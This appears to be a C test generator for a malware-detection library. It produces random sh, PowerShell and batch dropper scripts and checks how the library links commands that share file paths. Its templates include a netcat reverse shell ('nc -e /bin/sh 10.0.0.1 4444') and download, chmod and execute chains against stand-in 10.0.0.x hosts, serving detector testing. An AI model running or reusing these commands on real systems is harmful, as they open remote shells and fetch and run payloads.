/*
 * diag_text_ident_gen - random droppers against a MODEL of path identity (diag_text_ident.c), for sh, powershell and batch.
 *
 * A program is a list of commands, each from a table of templates that SAYS what it holds: `wget -q -O %P %U` makes the file P, `chmod +x %P` and `sh %P` name it, `chmod 755 /bin/sh`
 * names a file the script does not make, `Start-Process -FilePath notepad.exe -WindowStyle hidden` names a program and a word (`hidden`) that is no file, `curl -s %U` fetches and keeps
 * nothing. The program is written from the commands, with the paths drawn from a small pool (a bare name `a`, a name with a separator, upper and lower case of one path, a path held in a
 * variable), so the same path is named again and again, by commands that make it and commands that do not. The expected links come from what the TEMPLATES say, not from any reading of the
 * text: for each file a command holds, in the order written, a shared link from the last command that held it - if a command that makes a file has held it before; a name no
 * command makes (a system path) links nothing. The lib's graph is compared with that: the number and the capabilities of the nodes, then every shared link (from, to, role PATH) both ways,
 * and no produced link at all (nothing here is passed to anything).
 *
 * The distractors are what a looser rule would join: a mode word the commands repeat (`777`), the same system path in two nodes, a word that is no file in two (`hidden`), a URL, a
 * fetch with no output, a path that differs from another only in case (joined for a language that does not tell case apart, not for sh).
 *
 * usage: diag_text_ident_gen [programs-per-dialect [seed]]   (default 400)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <stdarg.h>

#include <phenotype/diag_scan.h>
#include <celllysis/nucleo.h>
#include <textual/textual.h>

static int fails;

#define CK(c, ...) do { if (!(c)) { printf("  FAIL %s:%d  ", __FILE__, __LINE__); printf(__VA_ARGS__); printf("\n"); fails++; } } while (0)

static uint32_t rs = 20261022u;

static uint32_t rnd(void)
{
	rs = rs * 1103515245u + 12345u;
	return rs >> 16;
}

static int chance(int pct)
{
	return (int)(rnd() % 100u) < pct;
}

/* ---- what a command says it holds ----------------------------------------------------------------------------------- */

enum { H_NONE, H_P, H_BASE, H_FIX };    /* no file; the path P; the last piece of P (a file the tool names by the URL); a fixed path of the template */

struct tpl {
	const char *fmt;        /* %P the path, %L the path as a literal, %Q the path quoted, %U a URL, %B the last piece of the path */
	uint16_t    cap;        /* the node the command makes */
	int         makes;      /* the command makes the file it holds */
	int         holds;
	const char *fix;        /* H_FIX: the value held */
};

struct dial {
	const char *name;
	uint32_t    lang;
	int         fold;
	const char *const *paths;       /* the pool: some bare, some with a separator */
	int         npaths;
	const struct tpl *t;
	int         nt;
	const char *var;                /* how a variable is assigned and read: "%V=%P" / "$%V" (sh); "$%V = \"%P\"" / "$%V" (psh); NULL none */
	const char *varref;
	const char *sep;                /* between commands */
};

static const char *const P_SH[] = { "a", "arm", "x86", "/tmp/a.sh", "./b.bin", "c.exe" };
static const char *const P_PSH[] = { "C:\\t\\a.exe", "C:\\t\\b.dll", "d\\e.ps1" };
static const char *const P_BAT[] = { "a.vbs", "C:\\t\\b.exe", "d\\e.bat" };

static const struct tpl T_SH[] = {
	{ "wget -q -O %P %U",          KGENOME_NUCLEO_HTTP_FETCH, 1, H_P,    NULL },
	{ "curl -s -o %P %U",          KGENOME_NUCLEO_HTTP_FETCH, 1, H_P,    NULL },
	{ "wget -q %U/%B",             KGENOME_NUCLEO_HTTP_FETCH, 1, H_BASE, NULL },
	{ "curl -s -O %U/%B",          KGENOME_NUCLEO_HTTP_FETCH, 1, H_BASE, NULL },
	{ "chmod 777 %P",              KGENOME_NUCLEO_PERM_SET,   0, H_P,    NULL },
	{ "chmod +x %P",               KGENOME_NUCLEO_PERM_SET,   0, H_P,    NULL },
	{ "sh %P",                     KGENOME_NUCLEO_EXEC_IMAGE, 0, H_P,    NULL },
	{ "bash %P",                   KGENOME_NUCLEO_EXEC_IMAGE, 0, H_P,    NULL },
	{ "chmod 755 /bin/sh",         KGENOME_NUCLEO_PERM_SET,   0, H_FIX,  "/bin/sh" },
	{ "chmod 600 /bin/sh",         KGENOME_NUCLEO_PERM_SET,   0, H_FIX,  "/bin/sh" },
	{ "curl -s %U",                KGENOME_NUCLEO_HTTP_FETCH, 1, H_NONE, NULL },
	{ "nc -e /bin/sh 10.0.0.1 4444", KGENOME_NUCLEO_NET_CONNECT, 0, H_FIX, "/bin/sh" },
	{ "base64 -d > %L",            KGENOME_NUCLEO_DECODE,     1, H_P,    NULL },
	{ "chmod 777 %P 2>/dev/null",  KGENOME_NUCLEO_PERM_SET,   0, H_P,    NULL },
	{ "curl -s %U > /dev/null",    KGENOME_NUCLEO_HTTP_FETCH, 1, H_NONE, NULL },
};

static const struct tpl T_PSH[] = {
	{ "Set-Content -Path %P -Value x",                  KGENOME_NUCLEO_WRITE,      1, H_P,    NULL },
	{ "[io.file]::WriteAllBytes(%Q, $d)",            KGENOME_NUCLEO_WRITE,      1, H_P,    NULL },
	{ "Invoke-WebRequest -Uri %U -OutFile %P",           KGENOME_NUCLEO_HTTP_FETCH, 1, H_P,    NULL },
	{ "Start-Process -FilePath %P",                      KGENOME_NUCLEO_EXEC_IMAGE, 0, H_P,    NULL },
	{ "Start-Process %P",                                KGENOME_NUCLEO_EXEC_IMAGE, 0, H_P,    NULL },
	{ "Start-Process -FilePath notepad.exe -WindowStyle hidden", KGENOME_NUCLEO_EXEC_IMAGE, 0, H_FIX, "notepad.exe" },
	{ "Start-Process -FilePath NOTEPAD.EXE -WindowStyle hidden", KGENOME_NUCLEO_EXEC_IMAGE, 0, H_FIX, "notepad.exe" },
	{ "Invoke-WebRequest -Uri %U",                       KGENOME_NUCLEO_HTTP_FETCH, 1, H_NONE, NULL },
};

static const struct tpl T_BAT[] = {
	{ "curl -o %P %U",                       KGENOME_NUCLEO_HTTP_FETCH, 1, H_P,    NULL },
	{ "curl --output %P %U",                 KGENOME_NUCLEO_HTTP_FETCH, 1, H_P,    NULL },
	{ "wscript %P",                          KGENOME_NUCLEO_EXEC_IMAGE, 0, H_P,    NULL },
	{ "cscript //nologo %P",                 KGENOME_NUCLEO_EXEC_IMAGE, 0, H_P,    NULL },
	{ "icacls %P /grant everyone:F",         KGENOME_NUCLEO_PERM_SET,   0, H_P,    NULL },
	{ "wscript C:\\Windows\\x.vbs",          KGENOME_NUCLEO_EXEC_IMAGE, 0, H_FIX,  "C:\\Windows\\x.vbs" },
	{ "curl %U",                             KGENOME_NUCLEO_HTTP_FETCH, 1, H_NONE, NULL },
	{ "nc 10.0.0.1 4444",                    KGENOME_NUCLEO_NET_CONNECT, 0, H_NONE, NULL },
};

static const struct dial D[] = {
	{ "sh",  KGENOME_TEXTUAL_LANG_SH,  0, P_SH,  6, T_SH,  15, "%V=%P",        "$%V",  "\n" },
	{ "psh", KGENOME_TEXTUAL_LANG_PSH, 1, P_PSH, 3, T_PSH, 8,  "$%V = \"%P\"", "$%V",  "\n" },
	{ "bat", KGENOME_TEXTUAL_LANG_BAT, 1, P_BAT, 3, T_BAT, 8,  NULL,           NULL,   "\n" },
};

#define MAXC 24

struct cmd {
	int  t, path, as_var, upper;    /* template, path pool index, written through the variable, upper-cased */
};

struct prog {
	struct cmd c[MAXC];
	int        n;
	int        var_path;            /* the pool index held in a variable, -1 none */
};

static int is_bare(const char *p)
{
	return !strpbrk(p, "/\\.");
}

static void gen(struct prog *p, const struct dial *d)
{
	int i;

	memset(p, 0, sizeof *p);
	p->n = 3 + (int)(rnd() % 12u);
	p->var_path = d->var && chance(40) ? (int)(rnd() % (unsigned)d->npaths) : -1;
	for (i = 0; i < p->n; i++) {
		struct cmd *c = &p->c[i];
		int tries = 0;

		do {
			c->t = (int)(rnd() % (unsigned)d->nt);
			c->path = (int)(rnd() % (unsigned)d->npaths);
			tries++;
			/* a command that is written with the file's own name as a bare word needs a path that is one */
		} while ((d->t[c->t].holds == H_BASE && !is_bare(d->paths[c->path])) && tries < 40);
		if (d->t[c->t].holds == H_BASE && !is_bare(d->paths[c->path]))
			c->path = 0;
		c->as_var = c->path == p->var_path && chance(80);
		c->upper = d->fold && chance(35);
	}
}

/* ---- the text and the model ------------------------------------------------------------------------------------------ */

static void upper_case(char *s)
{
	for (; *s; s++)
		*s = (char)toupper((unsigned char)*s);
}

static void expand(char *out, size_t cap, const char *fmt, const char *path, int url, const char *var_ref)
{
	size_t n = 0;
	const char *base;

	base = strrchr(path, '/');
	base = base ? base + 1 : path;
	for (; *fmt && n + 80 < cap; fmt++) {
		if (fmt[0] == '%' && fmt[1] == 'P') {
			n += (size_t)snprintf(out + n, cap - n, "%s", var_ref ? var_ref : path);
			fmt++;
		} else if (fmt[0] == '%' && fmt[1] == 'L') {     /* always the literal: a redirection target held in a variable is not followed */
			n += (size_t)snprintf(out + n, cap - n, "%s", path);
			fmt++;
		} else if (fmt[0] == '%' && fmt[1] == 'Q') {     /* the path as a quoted literal, or the variable (an interpolating string "$v" is not followed: the evaluator does not read it) */
			n += (size_t)snprintf(out + n, cap - n, var_ref ? "%s" : "\"%s\"", var_ref ? var_ref : path);
			fmt++;
		} else if (fmt[0] == '%' && fmt[1] == 'B') {
			n += (size_t)snprintf(out + n, cap - n, "%s", base);
			fmt++;
		} else if (fmt[0] == '%' && fmt[1] == 'U') {
			n += (size_t)snprintf(out + n, cap - n, "http://10.0.0.%d/q", url);
			fmt++;
		} else {
			out[n++] = *fmt;
		}
	}
	out[n] = 0;
}

struct held {
	char v[64];
	int  made;
	int  last;      /* the last command that held it, -1 none */
};

static const char *fold_key(const struct dial *d, const char *v, char *b)
{
	size_t i;

	for (i = 0; v[i] && i < 63; i++)
		b[i] = d->fold ? (char)tolower((unsigned char)v[i]) : v[i];
	b[i] = 0;
	return b;
}

static int run_one(const struct dial *d, const struct prog *p, int idx)
{
	static char text[16384];
	char line[256], vref[32], key[64], path[64];
	size_t n = 0;
	int i, k, nl = 0, nh = 0, have_link;
	struct { int to, from; } want[MAXC * 2];
	struct held h[MAXC];
	uint16_t caps[MAXC];
	struct kgenome_diag_text_req rq;
	struct kgenome_diag_scan *s;
	uint32_t cnt;
	int ok = 1;

	text[0] = 0;
	if (d->var && p->var_path >= 0) {
		const char *f = d->var;
		char *o = line;

		for (; *f; f++) {
			if (f[0] == '%' && f[1] == 'V') {
				o += sprintf(o, "Vq");
				f++;
			} else if (f[0] == '%' && f[1] == 'P') {
				o += sprintf(o, "%s", d->paths[p->var_path]);
				f++;
			} else {
				*o++ = *f;
			}
		}
		*o = 0;
		n += (size_t)snprintf(text + n, sizeof text - n, "%s%s", line, d->sep);
	}
	for (i = 0; i < p->n; i++) {
		const struct cmd *c = &p->c[i];
		const struct tpl *t = &d->t[c->t];
		const char *ref = NULL;

		strcpy(path, d->paths[c->path]);
		if (c->upper)
			upper_case(path);
		if (c->as_var && d->varref) {
			const char *f = d->varref;
			char *o = vref;

			for (; *f; f++) {
				if (f[0] == '%' && f[1] == 'V') {
					o += sprintf(o, "Vq");
					f++;
				} else {
					*o++ = *f;
				}
			}
			*o = 0;
			ref = vref;
		}
		expand(line, sizeof line, t->fmt, path, i + 1, ref);
		n += (size_t)snprintf(text + n, sizeof text - n, "%s%s", line, d->sep);
		if (chance(25))
			n += (size_t)snprintf(text + n, sizeof text - n, "echo done%s", d->sep);
		caps[i] = t->cap;
	}
	/* the model: what each command holds, in order */
	for (i = 0; i < p->n; i++) {
		const struct cmd *c = &p->c[i];
		const struct tpl *t = &d->t[c->t];
		const char *val = NULL;
		const char *base;
		int j, hit = -1;

		if (t->holds == H_P)
			val = d->paths[c->path];
		else if (t->holds == H_FIX)
			val = t->fix;
		else if (t->holds == H_BASE) {
			base = strrchr(d->paths[c->path], '/');
			val = base ? base + 1 : d->paths[c->path];
		}
		if (!val)
			continue;
		fold_key(d, val, key);
		for (j = 0; j < nh; j++)
			if (!strcmp(h[j].v, key))
				hit = j;
		if (hit < 0) {
			strcpy(h[nh].v, key);
			h[nh].made = 0;
			h[nh].last = -1;
			hit = nh++;
		}
		if (h[hit].made && h[hit].last >= 0 && h[hit].last != i) {
			want[nl].to = i;
			want[nl++].from = h[hit].last;
		}
		if (t->makes)
			h[hit].made = 1;
		h[hit].last = i;
	}
	memset(&rq, 0, sizeof rq);
	rq.base = (const uint8_t *)text;
	rq.size = strlen(text);
	rq.lang = d->lang;
	s = kgenome_diag_scan_text(&rq);
	if (!s) {
		printf("  %s: no scan\n", d->name);
		return 0;
	}
	cnt = kgenome_diag_scan_count(s);
	if (cnt != (uint32_t)p->n) {
		printf("  %s: %u nodes, %d commands\n", d->name, cnt, p->n);
		ok = 0;
	}
	for (i = 0; ok && i < p->n; i++) {
		const struct kgenome_diag_hit *hh = kgenome_diag_scan_at(s, (uint32_t)i);

		if (hh->cap != caps[i]) {
			printf("  %s: node %d is %s, the template says %s\n", d->name, i, kgenome_nucleo_cap_name(hh->cap), kgenome_nucleo_cap_name(caps[i]));
			ok = 0;
		}
		for (k = 0; ok && k < hh->n_in; k++) {
			int j;

			have_link = 0;
			for (j = 0; j < nl; j++)
				have_link |= want[j].to == i && want[j].from == hh->in[k].from;
			if (hh->in[k].kind != KGENOME_DIAG_KIND_SHARED || hh->in[k].role != KGENOME_DIAG_ROLE_PATH || !have_link) {
				printf("  %s: node %d has a link from %u (kind %u role %u) the templates do not give\n", d->name, i, hh->in[k].from, hh->in[k].kind, hh->in[k].role);
				ok = 0;
			}
		}
	}
	for (k = 0; ok && k < nl; k++) {
		const struct kgenome_diag_hit *hh = kgenome_diag_scan_at(s, (uint32_t)want[k].to);
		int j, found = 0;

		for (j = 0; j < hh->n_in; j++)
			found |= hh->in[j].from == want[k].from && hh->in[j].kind == KGENOME_DIAG_KIND_SHARED;
		if (!found) {
			printf("  %s: the shared link %d <- %d is missing\n", d->name, want[k].to, want[k].from);
			ok = 0;
		}
	}
	kgenome_diag_scan_free(s);
	if (!ok)
		printf("--- %s program %d:\n%s\n", d->name, idx, text);
	return ok;
}

/* A written program, and whether node `to` must have a shared link from node `from` (-1: no node has any). */
static const struct { const char *what; uint32_t lang; const char *src; int to, from; } LIT[] = {
	{ "vbs: a file made, then run (case does not matter)", KGENOME_TEXTUAL_LANG_VBS,
	  "Set fso = CreateObject(\"Scripting.FileSystemObject\")\nSet f = fso.CreateTextFile(\"C:\\ProgramData\\a.vbs\", True)\nSet sh = CreateObject(\"WScript.Shell\")\nsh.Run \"c:\\programdata\\A.vbs\"\n", 1, 0 },
	{ "sh -c takes text, not a file", KGENOME_TEXTUAL_LANG_SH, "wget -O ls http://x/q\nsh -c ls\n", -1, -1 },
	{ "sh: a mode is not a file name", KGENOME_TEXTUAL_LANG_SH, "wget -O 777 http://x/q\nchmod 777\n", -1, -1 },
	{ "sh: a URL is where a thing is, not a file", KGENOME_TEXTUAL_LANG_SH, "curl -s http://x/q\ncurl -s http://x/q\n", -1, -1 },
	{ "sh: a node that names a file twice is not linked to itself", KGENOME_TEXTUAL_LANG_SH, "curl -s -o a -o a http://x/q\nchmod 777 b\n", -1, -1 },
	{ "sh: the same case is another file", KGENOME_TEXTUAL_LANG_SH, "wget -O a http://x/q\nchmod 777 A\n", -1, -1 },
	{ "sh: a mode and an option are no file", KGENOME_TEXTUAL_LANG_SH, "wget -O a http://x/q\nchmod 777 b\nchmod 777 c\n", -1, -1 },
	{ "sh: wget keeps the last piece of the URL", KGENOME_TEXTUAL_LANG_SH, "wget http://x/y/arm\nchmod 777 arm\n", 1, 0 },
	{ "sh: a redirection makes the file", KGENOME_TEXTUAL_LANG_SH, "echo QQ | base64 -d > /tmp/x.sh\nbash /tmp/x.sh\n", 1, 0 },
	{ "sh: the null device is nobody's file", KGENOME_TEXTUAL_LANG_SH, "curl -s http://x/q > /dev/null\nchmod 600 b 2>/dev/null\nwget -q -O c http://x/q 2>/dev/null\n", -1, -1 },
	{ "sh: a device named as a word is nobody's file", KGENOME_TEXTUAL_LANG_SH, "curl -s -o /dev/null http://x/q\nchmod 600 /dev/null\n", -1, -1 },
	{ "sh: curl without -O keeps nothing", KGENOME_TEXTUAL_LANG_SH, "curl http://x/y/arm\nchmod 777 arm\n", -1, -1 },
	{ "sh: the downloaded file is a chain", KGENOME_TEXTUAL_LANG_SH, "wget -O /tmp/x http://x/q\nchmod +x /tmp/x\nsh /tmp/x\n", 2, 1 },
	{ "sh: a system path is no object of the script", KGENOME_TEXTUAL_LANG_SH, "chmod 755 /bin/sh\nchmod 755 /bin/sh\n", -1, -1 },
	{ "psh: write then start, a variable holds the path", KGENOME_TEXTUAL_LANG_PSH, "$p = \"C:\\x\\a.exe\"\nSet-Content -Path $p -Value x\nStart-Process -FilePath C:\\X\\A.EXE\n", 1, 0 },
};

static void literal(void)
{
	size_t i;

	for (i = 0; i < sizeof LIT / sizeof LIT[0]; i++) {
		struct kgenome_diag_text_req rq = { .base = (const uint8_t *)LIT[i].src, .size = strlen(LIT[i].src), .lang = LIT[i].lang };
		struct kgenome_diag_scan *s = kgenome_diag_scan_text(&rq);
		uint32_t h, any = 0, found = 0;
		uint8_t k;

		CK(s != NULL, "%s: a scan", LIT[i].what);
		if (!s)
			continue;
		for (h = 0; h < kgenome_diag_scan_count(s); h++) {
			const struct kgenome_diag_hit *hit = kgenome_diag_scan_at(s, h);

			for (k = 0; k < hit->n_in; k++) {
				any += hit->in[k].kind == KGENOME_DIAG_KIND_SHARED;
				if ((int)h == LIT[i].to && hit->in[k].from == LIT[i].from && hit->in[k].kind == KGENOME_DIAG_KIND_SHARED)
					found = 1;
			}
		}
		if (LIT[i].to < 0)
			CK(any == 0, "%s: %u shared links, wanted none", LIT[i].what, any);
		else
			CK(found && any == (LIT[i].to == 2 ? 2u : 1u), "%s: the link is %s, %u shared links", LIT[i].what, found ? "there" : "missing", any);
		kgenome_diag_scan_free(s);
	}
}

int main(int argc, char **argv)
{
	int per = argc > 1 ? atoi(argv[1]) : 400, di, with_link[3] = { 0 }, skipped = 0;
	static struct prog p;

	if (argc > 2)
		rs = (uint32_t)strtoul(argv[2], NULL, 10);
	literal();
	for (di = 0; di < (int)(sizeof D / sizeof D[0]); di++) {
		int i;

		for (i = 0; i < per; i++) {
			int j, k, any = 0;

			gen(&p, &D[di]);
			/* programs where a node would keep more than the four inputs are not what is tested */
			{
				int cntn[MAXC] = { 0 };
				for (j = 0; j < p.n; j++)
					for (k = 0; k < j; k++)
						any += 0;
				(void)cntn;
			}
			if (!run_one(&D[di], &p, i)) {
				fails++;
				if (fails > 3)
					goto out;
			} else {
				with_link[di] += 1;
			}
		}
	}
out:
	for (di = 0; di < (int)(sizeof D / sizeof D[0]); di++)
		printf("%-4s %d programs ok\n", D[di].name, with_link[di]);
	(void)skipped;
	printf(fails ? "FAILED: %d\n" : "diag_text_ident_gen: ok\n", fails);
	return fails != 0;
}
